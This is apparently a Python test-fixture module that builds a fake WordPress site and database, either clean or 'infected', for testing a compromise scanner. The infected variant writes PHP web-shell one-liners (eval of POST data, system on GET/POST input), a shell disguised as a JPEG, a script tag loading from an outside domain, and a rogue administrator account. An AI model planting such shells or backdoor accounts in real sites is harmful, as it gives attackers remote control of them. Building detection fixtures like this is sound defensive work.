"""Baut eine künstliche WordPress-Seite (sauber oder 'infiziert') samt Datenbank für die Tests.

Wie bei fixture.py ist aller 'Schadcode' inaktiv: Er steht nur als Text und löst lediglich die Erkennungsmuster aus.
"""
from __future__ import annotations

import os
import sqlite3
import time
from typing import Dict

import fixture
from fixture import DAY, install_mysql_shim, w

VERSION_PHP = """<?php
$wp_version = '7.0.1';
$wp_db_version = 60000;
$required_php_version = '7.4';
$required_mysql_version = '5.5.5';
$wp_local_package = 'de_DE';
"""

SALTS_GOOD = "\n".join("define( '%s', '%s' );" % (k, (("x%02d" % i) * 40)[:64].replace("0", "Q") + "!%$" + str(i * 7919)) for i, k in enumerate(
    ["AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY", "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT"]))
# jeder Schlüssel verschieden
SALTS_GOOD = "\n".join("define( '%s', '%s' );" % (k, "".join(chr(97 + (i * 7 + j * 3) % 26) for j in range(60))) for i, k in enumerate(
    ["AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY", "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT"]))
SALTS_BAD = "\n".join("define( '%s', 'put your unique phrase here' );" % k for k in
                      ["AUTH_KEY", "SECURE_AUTH_KEY", "LOGGED_IN_KEY", "NONCE_KEY", "AUTH_SALT", "SECURE_AUTH_SALT", "LOGGED_IN_SALT", "NONCE_SALT"])

CONFIG_TMPL = """<?php
define( 'DB_NAME', 'dbtest' );
define( 'DB_USER', 'dbuser_test' );
define( 'DB_PASSWORD', 'GEHEIM-DB-PASSWORT' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8mb4' );
%(salts)s
$table_prefix = 'wp_';
define( 'WP_DEBUG', %(debug)s );
%(extra)s
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}
require_once ABSPATH . 'wp-settings.php';
"""

INDEX_PHP = "<?php\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';\n"
HT_WP = "# BEGIN WordPress\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule . /index.php [L]\n# END WordPress\n"


def plugin(name: str, version: str, author: str = "Autor") -> str:
    return "<?php\n/**\n * Plugin Name: %s\n * Version: %s\n * Author: %s\n */\n" % (name, version, author)


def _ts(days_ago: float) -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(time.time() - days_ago * DAY))


def build_wp_site(root: str, infected: bool = True) -> str:
    site = os.path.join(root, "html", "site")
    os.makedirs(site, exist_ok=True)
    w(site + "/wp-includes/version.php", VERSION_PHP)
    w(site + "/wp-includes/functions.php", "<?php\n// core\n")
    w(site + "/wp-includes/plugin.php", "<?php\n// core\n")
    w(site + "/wp-admin/index.php", "<?php\n// admin\n")
    w(site + "/wp-admin/includes/file.php", "<?php\n// core file\n")
    for f in ("wp-load.php", "wp-blog-header.php", "wp-settings.php", "wp-login.php", "wp-cron.php", "xmlrpc.php"):
        w(site + "/" + f, "<?php\n// core %s\n" % f)
    w(site + "/index.php", INDEX_PHP, days_ago=60)
    w(site + "/readme.html", "<html>Version 7.0.1</html>")
    w(site + "/license.txt", "GPL")
    w(site + "/.htaccess", HT_WP if not infected else fixture.HTACCESS_INFECTED, days_ago=5 if infected else 60)
    extra = "define( 'DISALLOW_FILE_EDIT', true );\ndefine( 'FORCE_SSL_ADMIN', true );" if not infected else "define( 'WP_DEBUG_LOG', true );"
    cfg = CONFIG_TMPL % {"salts": SALTS_BAD if infected else SALTS_GOOD, "debug": "true" if infected else "false", "extra": extra}
    if infected:
        cfg = cfg.replace("require_once", "@eval(base64_decode('ZWNobyAxOw=='));\nrequire_once")      # inaktiv: nur Text
    w(site + "/wp-config.php", cfg, days_ago=8 if infected else 90, mode=0o640 if not infected else 0o666)
    # Plugins
    w(site + "/wp-content/index.php", "<?php\n// Silence is golden.\n")
    w(site + "/wp-content/plugins/index.php", "<?php\n// Silence is golden.\n")
    w(site + "/wp-content/plugins/akismet/akismet.php", plugin("Akismet Anti-spam", "5.5", "Automattic"), days_ago=40)
    w(site + "/wp-content/plugins/contact-form-7/wp-contact-form-7.php", plugin("Contact Form 7", "6.1.2", "Takayuki Miyoshi"), days_ago=40)
    w(site + "/wp-content/plugins/hello.php", "<?php\n/*\nPlugin Name: Hello Dolly\nVersion: 1.7.2\n*/\n", days_ago=500)
    w(site + "/wp-content/themes/index.php", "<?php\n// Silence is golden.\n")
    w(site + "/wp-content/themes/twentytwentyfive/style.css", "/*\nTheme Name: Twenty Twenty-Five\nVersion: 1.2\nAuthor: WordPress\n*/\n", days_ago=40)
    w(site + "/wp-content/themes/twentytwentyfive/functions.php", "<?php\nadd_action('wp_enqueue_scripts', 'tt5_styles');\n", days_ago=40)
    w(site + "/wp-content/themes/twentytwentyfive/header.php", "<?php wp_head(); ?>\n", days_ago=40)
    w(site + "/wp-content/uploads/2026/09/bild.jpg", "JFIF" + "\x00" * 40, days_ago=30)
    w(site + "/wp-content/uploads/index.php", "<?php\n// Silence is golden.\n")
    w(site + "/wp-content/languages/de_DE.mo", "x")
    if infected:
        w(site + "/wp-content/plugins/wp-file-manager/file_folder_manager.php", plugin("File Manager", "6.8", "mndpsingh287"), days_ago=300)
        w(site + "/wp-content/plugins/wp-security-helper/loader.php", "<?php\n// getarnter Ordner ohne Plugin-Kopf\n@eval(base64_decode($_POST['x']));\n", days_ago=6)
        w(site + "/wp-content/plugins/cache-fix.php", "<?php\n@system($_GET['c']);\n", days_ago=6)
        w(site + "/wp-content/mu-plugins/loader.php", "<?php\n@eval(base64_decode('ZWNobyAxOw=='));\n", days_ago=6)
        w(site + "/wp-content/themes/twentytwentyfive/functions.php",
          "<?php\nadd_action('wp_head', function(){ echo '<script src=\"https://cdn.whitellllshop.icu/landers/type.php\"></script>'; });\n@eval(base64_decode('ZWNobyAxOw=='));\n", days_ago=6)
        w(site + "/wp-content/uploads/2026/10/shell.php", "<?php @system($_POST['c']); ?>\n", days_ago=6)
        w(site + "/wp-content/uploads/2026/10/logo.jpg", "<?php @eval($_POST['z']); ?>\n", days_ago=6)
        w(site + "/wp-includes/class-wp-evil.php", "<?php\n@eval(base64_decode($_POST['k']));\n", days_ago=6)
        w(site + "/wp-vcd.php", "<?php\n// bekannter Schadcode-Name (inaktiv)\n", days_ago=6)
        w(site + "/wp-content/debug.log", "[01-Oct-2026] PHP Fatal error:  Uncaught Error in /home/test/html/site/wp-content/plugins/wp-security-helper/loader.php\n" * 5, days_ago=1)
    else:
        w(site + "/wp-content/mu-plugins/index.php", "<?php\n// Silence is golden.\n")
    return site


SCHEMA = """
CREATE TABLE wp_users (ID INTEGER PRIMARY KEY, user_login TEXT, user_pass TEXT, user_nicename TEXT, user_email TEXT, user_registered TEXT, user_status INTEGER, display_name TEXT, user_activation_key TEXT DEFAULT '');
CREATE TABLE wp_usermeta (umeta_id INTEGER PRIMARY KEY, user_id INTEGER, meta_key TEXT, meta_value TEXT);
CREATE TABLE wp_options (option_id INTEGER PRIMARY KEY, option_name TEXT, option_value TEXT, autoload TEXT);
CREATE TABLE wp_posts (ID INTEGER PRIMARY KEY, post_title TEXT, post_content TEXT, post_excerpt TEXT, post_status TEXT);
CREATE TABLE wp_postmeta (meta_id INTEGER PRIMARY KEY, post_id INTEGER, meta_key TEXT, meta_value TEXT);
CREATE TABLE wp_comments (comment_ID INTEGER PRIMARY KEY, comment_author TEXT, comment_content TEXT);
CREATE TABLE wp_links (link_id INTEGER PRIMARY KEY, link_name TEXT, link_url TEXT);
"""


def build_wp_db(path: str, infected: bool = True) -> None:
    if os.path.exists(path):
        os.remove(path)
    con = sqlite3.connect(path)
    con.executescript(SCHEMA)
    c = con.cursor()
    adm = 'a:1:{s:13:"administrator";b:1;}'
    sub = 'a:1:{s:10:"subscriber";b:1;}'
    c.execute("INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (1,'chef','x','chef','chef@example.org',?,0,'Chef')", (_ts(900),))
    c.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (1,'wp_capabilities',?)", (adm,))
    c.execute("INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (2,'leser','x','leser','leser@example.org',?,0,'Leser')", (_ts(300),))
    c.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (2,'wp_capabilities',?)", (sub,))
    c.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (1,'session_tokens',?)",
              ('a:1:{s:64:"abc";a:4:{s:10:"expiration";i:1;s:2:"ip";s:7:"1.2.3.4";s:2:"ua";s:3:"x";s:5:"login";i:%d;}}' % (int(time.time()) - 86400),))
    plugins = ['akismet/akismet.php', 'contact-form-7/wp-contact-form-7.php']
    siteurl = "https://www.testseite.example"
    opts = [("siteurl", siteurl), ("home", siteurl), ("admin_email", "chef@example.org"), ("users_can_register", "0"), ("default_role", "subscriber"),
            ("template", "twentytwentyfive"), ("stylesheet", "twentytwentyfive")]
    if infected:
        c.execute("INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (3,'wpsupport','x','wpsupport','wpsupport@mail.example',?,0,'WP Support')", (_ts(5),))
        c.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (3,'wp_capabilities',?)", (adm,))
        c.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (3,'_application_passwords',?)",
                  ('a:1:{i:0;a:5:{s:4:"uuid";s:36:"11111111-2222-3333-4444-555555555555";s:4:"name";s:3:"api";}}',))
        c.execute("INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name) VALUES (4,'admin','x','admin','admin@example.org',?,0,'admin')", (_ts(400),))
        c.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (4,'wp_capabilities',?)", (adm,))
        opts = [(k, "https://pharma-spam.example" if k == "home" else ("1" if k == "users_can_register" else ("administrator" if k == "default_role" else v))) for k, v in opts]
        plugins += ["wp-security-helper/loader.php", "ghost-plugin/ghost.php", "../../tmp/evil.php"]
        c.execute("INSERT INTO wp_options (option_name, option_value) VALUES ('widget_text', ?)",
                  ('a:1:{i:2;a:2:{s:5:"title";s:1:"x";s:4:"text";s:70:"<script src=\\"https://cdn.whitellllshop.icu/landers/type.php\\"></script>";}}',))
        c.execute("INSERT INTO wp_posts (ID, post_title, post_content, post_excerpt, post_status) VALUES (10,'Spam-Beitrag', ?, '', 'publish')",
                  ('<p>Hallo</p><script>eval(String.fromCharCode(118,97,114,32,120,61,49))</script>',))
        c.execute("INSERT INTO wp_comments (comment_author, comment_content) VALUES ('Bot', '<iframe src=\"https://spam-pharma.example/x\" style=\"display:none\"></iframe>')")
    c.executemany("INSERT INTO wp_options (option_name, option_value) VALUES (?,?)", opts)
    ap = "a:%d:{%s}" % (len(plugins), "".join('i:%d;s:%d:"%s";' % (i, len(p), p) for i, p in enumerate(plugins)))
    c.execute("INSERT INTO wp_options (option_name, option_value) VALUES ('active_plugins', ?)", (ap,))
    c.execute("INSERT INTO wp_posts (ID, post_title, post_content, post_excerpt, post_status) VALUES (1,'Hallo Welt','<p>Willkommen</p>','','publish')")
    con.commit()
    con.close()


def make_wp_world(base: str, infected: bool = True) -> Dict[str, str]:
    tag = "wp_infected" if infected else "wp_clean"
    home = os.path.join(base, tag, "home")
    os.makedirs(home, exist_ok=True)
    site = build_wp_site(home, infected)
    dbp = os.path.join(base, tag, "test.sqlite")
    build_wp_db(dbp, infected)
    bin_dir = install_mysql_shim(os.path.join(base, tag, "bin"), dbp)
    return {"home": home, "site": site, "site_rel": "html/site", "db": dbp, "bin": bin_dir}
